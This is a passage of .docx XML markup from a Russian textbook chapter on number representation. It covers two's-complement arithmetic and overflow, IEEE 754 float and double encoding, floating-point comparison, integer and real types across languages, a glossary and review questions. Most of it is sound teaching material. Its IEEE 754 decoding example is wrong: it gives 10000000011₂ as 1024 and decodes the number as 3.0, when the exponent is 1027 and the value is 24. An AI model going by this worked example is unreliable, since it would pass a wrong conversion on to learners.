    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>−100₁₀ = 10011100₂ (в дополнительном коде)</w:t>
        <w:br/>
        <w:t>−50₁₀  = 11001110₂ (в дополнительном коде)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  10011100</w:t>
        <w:br/>
        <w:t>+ 11001110</w:t>
        <w:br/>
        <w:t>----------</w:t>
        <w:br/>
        <w:t>1 01101010</w:t>
        <w:br/>
        <w:br/>
        <w:t>Отбрасываем перенос за пределы 8 бит: 01101010₂</w:t>
        <w:br/>
        <w:br/>
        <w:t>Переводим: 01101010₂ = 64 + 32 + 8 + 2 = 106₁₀</w:t>
        <w:br/>
        <w:br/>
        <w:t>Результат: −100 − 50 = 106 (переполнение!)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Объяснение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Правильный результат −150 выходит за пределы диапазона [−128, +127], произошло переполнение.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 5: Представление числа в формате IEEE 754 float</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Представьте число −6.25₁₀ в формате IEEE 754 single precision (32 бита).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Шаг 1: Переведём модуль в двоичную систему:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>6₁₀ = 110₂</w:t>
        <w:br/>
        <w:t>0.25₁₀ = 0.01₂  (0.25 = 1/4 = 2⁻²)</w:t>
        <w:br/>
        <w:br/>
        <w:t>6.25₁₀ = 110.01₂</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Шаг 2: Нормализуем:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>110.01₂ = 1.1001₂ × 2²</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Шаг 3: Определяем компоненты:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Знак S: 1 (отрицательное число)</w:t>
        <w:br/>
        <w:t>Экспонента: 2 + 127 = 129₁₀ = 10000001₂</w:t>
        <w:br/>
        <w:t>Мантисса: 1001 (после десятичной точки, дополняем нулями до 23 бит)</w:t>
        <w:br/>
        <w:t xml:space="preserve">          10010000000000000000000</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Шаг 4: Собираем представление:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Знак: 1</w:t>
        <w:br/>
        <w:t>Экспонента: 10000001</w:t>
        <w:br/>
        <w:t>Мантисса: 10010000000000000000000</w:t>
        <w:br/>
        <w:br/>
        <w:t>Полное представление (32 бита):</w:t>
        <w:br/>
        <w:t>1 10000001 10010000000000000000000</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> −6.25₁₀ в IEEE 754 float:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Шестнадцатеричное: 0xC0C80000</w:t>
        <w:br/>
        <w:t>Двоичное: 11000000110010000000000000000000</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 6: Декодирование из IEEE 754</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Декодируйте число, представленное в формате IEEE 754 double (64 бита):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0 10000000011 1000000000000000000000000000000000000000000000000000</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Шаг 1: Разбиваем на компоненты:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Знак S = 0 (положительное)</w:t>
        <w:br/>
        <w:t>Экспонента E = 10000000011₂ = 1024₁₀</w:t>
        <w:br/>
        <w:t>Мантисса M = 1000...0 (52 бита)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Шаг 2: Вычисляем реальную экспонен ту:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Реальная экспонента = E − 1023 = 1024 − 1023 = 1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Шаг 3: Восстанавливаем мантиссу с неявной единицей:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Мантисса = 1.1000...0₂ = 1.5₁₀  (1 + 0.5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Шаг 4: Вычисляем итоговое значение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Значение = (−1)⁰ × 1.5 × 2¹</w:t>
        <w:br/>
        <w:t xml:space="preserve">         = 1 × 1.5 × 2</w:t>
        <w:br/>
        <w:t xml:space="preserve">         = 3.0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Закодированное число = 3.0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 7: Проблема точности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Объясните, почему в программировании выражение `0.1 + 0.1 + 0.1 == 0.3` может вернуть `false`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Объяснение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Число 0.1₁₀ не имеет точного представления в двоичной системе:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0.1₁₀ = 0.0001100110011001100110011...₂  (бесконечная периодическая дробь)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>При хранении в формате float или double происходит округление, например, в double:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0.1 ≈ 0.1000000000000000055511151231257827021181583404541015625</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>При сложении трёх таких приближённых значений:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0.1 + 0.1 + 0.1 ≈ 0.30000000000000004</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>А число 0.3 также приближённо:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0.3 ≈ 0.299999999999999988897769753748434595763683319091796875</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эти два значения не совпадают побитово, поэтому сравнение на точное равенство `==` возвращает `false`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правильное сравнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>epsilon = 1e-9</w:t>
        <w:br/>
        <w:t>result = 0.1 + 0.1 + 0.1</w:t>
        <w:br/>
        <w:t>expected = 0.3</w:t>
        <w:br/>
        <w:t>if abs(result - expected) &lt; epsilon:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("Числа считаются равными")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Типы данных в языках программирования</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Различные языки программирования предоставляют различные типы данных для работы с числами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Целые числа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Язык       | Тип                | Размер     | Диапазон (знаковые)                       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| ---------- | ------------------ | ---------- | ----------------------------------------- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| C/C++      | `char`             | 8 бит      | −128 ... 127                              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|            | `short`            | 16 бит     | −32 768 ... 32 767                        |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|            | `int`              | 32 бита    | −2 147 483 648 ... 2 147 483 647          |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|            | `long long`        | 64 бита    | −2⁶³ ... (2⁶³−1)                          |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Java       | `byte`             | 8 бит      | −128 ... 127                              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|            | `short`            | 16 бит     | −32 768 ... 32 767                        |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|            | `int`              | 32 бита    | −2 147 483 648 ... 2 147 483 647          |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|            | `long`             | 64 бита    | −2⁶³ ... (2⁶³−1)                          |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Python 3   | `int`              | Переменный | Ограничен только памятью                  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| JavaScript | `Number` (целая ч.)| 53 бита    | −(2⁵³−1) ... (2⁵³−1) (целые в double)     |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Замечание:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> В Python 3 тип `int` имеет произвольную точность (arbitrary precision) и может представлять сколь угодно большие целые числа, ограничиваясь только доступной памятью.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Вещественные числа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Язык       | Тип      | Размер  | Точность           | Стандарт  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| ---------- | -------- | ------- | ------------------ | --------- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| C/C++      | `float`  | 32 бита | ~7 дес. цифр       | IEEE 754  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|            | `double` | 64 бита | ~15-16 дес. цифр   | IEEE 754  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Java       | `float`  | 32 бита | ~7 дес. цифр       | IEEE 754  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|            | `double` | 64 бита | ~15-16 дес. цифр   | IEEE 754  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Python     | `float`  | 64 бита | ~15-16 дес. цифр   | IEEE 754  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| JavaScript | `Number` | 64 бита | ~15-16 дес. цифр   | IEEE 754  |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Практическое значение и применение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>В архитектуре компьютеров</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Регистры процессора:** Современные процессоры имеют регистры 32-битные (x86) или 64-битные (x64), определяющие разрядность целочисленных операций.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**АЛУ (арифметико-логическое устройство):** Выполняет операции в дополнительном коде для целых чисел и по стандарту IEEE 754 для вещественных.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**FPU (floating-point unit):** Специализированный блок процессора для быстрых операций с числами с плавающей точкой.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>В программировании</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Выбор типа данных:** Правильный выбор типа данных (int, long, float, double) критичен для производительности и корректности программы.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Финансовые расчёты:** Использование специальных типов (Decimal) для избежания ошибок округления.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Научные вычисления:** Использование double для большей точности, библиотеки произвольной точности (mpmath, GMP) для экстремальных требований.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>В криптографии</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Большие целые числа:** Алгоритмы шифрования (RSA, Diffie-Hellman) оперируют целыми числами размером 1024-4096 бит.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Модульная арифметика:** Использует целочисленные операции с большими модулями.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>В графике и обработке сигналов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Представление цвета:** RGB-компоненты обычно хранятся как беззнаковые 8-битные целые (0-255).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Аудио:** Сэмплы звука хранятся как знаковые 16-битные или 24-битные целые.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Координаты и трансформации:** Используются вещественные числа (float, double) для точности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Связь с другими темами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Изученная в этой главе тема тесно связана с:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.1**: Арифметика в двоичной системе счисления — операции с двоичными числами, которые применяются к целым числам в дополнительном коде.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.2**: Представление данных в памяти ЭВМ — числа хранятся в памяти согласно рассмотренным форматам, учитывается порядок байтов (Little/Big Endian).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.11**: Системы счисления — перевод чисел между системами счисления необходим для понимания двоичного представления.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 2 (Архитектура ЭВМ)**: Процессор выполняет операции с числами в изученных форматах, АЛУ и FPU реализуют соответствующую логику.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 6 (Языки программирования)**: Типы данных в языках программирования напрямую соответствуют рассмотренным форматам представления чисел.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Беззнаковое целое число (unsigned integer)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — неотрицательное целое число, представленное в двоичной системе без знака, диапазон от 0 до (2ⁿ − 1).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Знаковое целое число (signed integer)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — целое число, которое может быть положительным, отрицательным или нулём.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Прямой код (sign-magnitude)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — способ представления знаковых чисел, где старший бит кодирует знак, остальные биты — модуль числа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Обратный код (one's complement)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — способ представления знаковых чисел, где отрицательное число получается инверсией всех битов положительного.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дополнительный код (two's complement)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — стандартный способ представления знаковых чисел в современных компьютерах, где отрицательное число получается инверсией битов положительного числа и прибавлением 1.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Переполнение (overflow)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — ситуация, когда результат операции выходит за пределы допустимого диапазона представления числа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вещественное число (floating-point number)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — число с дробной частью, представленное в формате с плавающей точкой.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IEEE 754</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — международный стандарт представления вещественных чисел с плавающей точкой в компьютерах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Нормализованная форма</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — представление числа с плавающей точкой в виде 1.xxxxx × 2^exp, где старший бит мантиссы равен 1.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Мантисса (mantissa, significand)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — часть числа с плавающей точкой, хранящая значащие цифры.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Экспонента (exponent)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — часть числа с плавающей точкой, определяющая порядок (степень двойки).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NaN (Not a Number)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — специальное значение в формате IEEE 754, обозначающее результат неопределённой операции.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Денормализованное число (subnormal, denormal)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — число с плавающей точкой с экспонентой 0 и ненулевой мантиссой, используется для представления очень малых чисел.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы для самопроверки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**В чём основное преимущество дополнительного кода** перед прямым и обратным кодами при представлении знаковых целых чисел? Почему современные компьютеры используют именно дополнительный код?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Представьте число −100₁₀** в 8-битном дополнительном коде. Выполните проверку, сложив +100 и −100.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Определите диапазон значений** для 32-битных знаковых целых чисел в дополнительном коде. Какое наименьшее и наибольшее число можно представить?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объясните структуру числа в формате IEEE 754 single precision (float).** Сколько бит отведено под знак, экспоненту и мантиссу? Что такое "неявная единица"?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Почему в программировании опасно сравнивать вещественные числа на точное равенство** (например, `a == b`)? Как правильно сравнивать вещественные числа?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое NaN и когда оно возникает?** Какое необычное свойство имеет NaN при сравнении самого с собой?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача на расчёт:** Декодируйте число, представленное в 8-битном дополнительном коде: 10110011₂. Какое десятичное число оно представляет?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что произойдёт при выполнении операции 127 + 1** в 8-битной знаковой арифметике (дополнительный код)? Объясните причину.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Переведите число 5.75₁₀** в формат IEEE 754 float (32 бита). Укажите двоичное представление знака, экспоненты и мантиссы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**В каких областях критически важна точность представления чисел?** Приведите примеры и объясните, какие типы данных следует использовать.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Резюме главы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе мы изучили:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Представление целых чисел:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Беззнаковые целые (диапазон 0 ... 2ⁿ−1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
